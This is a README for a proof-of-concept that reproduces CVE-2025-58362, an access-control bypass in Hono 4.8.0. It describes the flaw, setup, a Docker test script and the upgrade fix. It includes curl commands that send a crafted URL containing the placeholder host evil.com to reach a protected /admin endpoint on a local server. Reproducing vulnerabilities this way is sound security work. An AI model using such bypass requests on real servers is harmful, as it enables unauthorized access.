# CVE-2025-58362 PoC - Vulnerable Hono Server

This demonstrates the CVE-2025-58362 vulnerability in Hono framework version 4.8.0.

## Vulnerability Details

- **CVE ID**: CVE-2025-58362
- **Package**: npm hono
- **Affected Versions**: >= 4.8.0, < 4.9.6
- **Fixed Version**: 4.9.6
- **Severity**: High (CVSS 7.5)

## Description

The original implementation relied on fixed character offsets when parsing request URLs. Under certain malformed absolute-form Request-URIs, this could lead to incorrect path extraction, potentially allowing unauthorized access to protected endpoints.

## Setup

1. Install dependencies:
```bash
npm install
```

2. Start the vulnerable server:
```bash
npm start
```

The server will start on port 3000.

## Running the PoC

### Automated PoC Execution
```bash
# Make script executable
chmod +x run.sh

# Run complete PoC (recommended)
./run.sh
```

### Using npm Script
```bash
# Run complete PoC
npm run poc
```

### What the PoC Does
The script automatically performs these steps:
1. **Build Docker image** with vulnerable Hono 4.8.0
2. **Start server** on port 3000
3. **Health check** (5 attempts with 2s delay)
4. **Vulnerability testing** with multiple test cases
5. **Clean up** (remove container and image)

### Manual Testing (Optional)
If you want to test manually after running the PoC:
```bash
# Start server manually
npm start

# Test with curl
curl http://localhost:3000/admin
curl "http://localhost:3000/https://example.com:8080@evil.com/admin"
```

## Testing the Vulnerability

Once the server is running, test with curl:
```bash
# This should be blocked (normal admin request)
curl http://localhost:3000/admin

# This might bypass security (vulnerable URL)
curl "http://localhost:3000/https://example.com:8080@evil.com/admin"
```

## Expected Behavior

- Normal `/admin` requests should be blocked (403 Forbidden)
- Malicious URLs with complex structures might bypass the security middleware
- The vulnerability occurs due to incorrect path parsing in Hono 4.8.0

## Security Impact

If proxy ACLs are used to protect sensitive endpoints such as `/admin`, this flaw could allow unauthorized access. The confidentiality impact depends on what data is exposed.

## Mitigation

Upgrade to Hono version 4.9.6 or later, which fixes the URL parsing logic.

## Files

- `server.js` - Vulnerable Hono server using version 4.8.0
- `package.json` - Dependencies including vulnerable Hono version
- `Dockerfile` - Docker configuration for the vulnerable server
- `run.sh` - Shell script for Docker operations
- `.dockerignore` - Files to ignore during Docker build
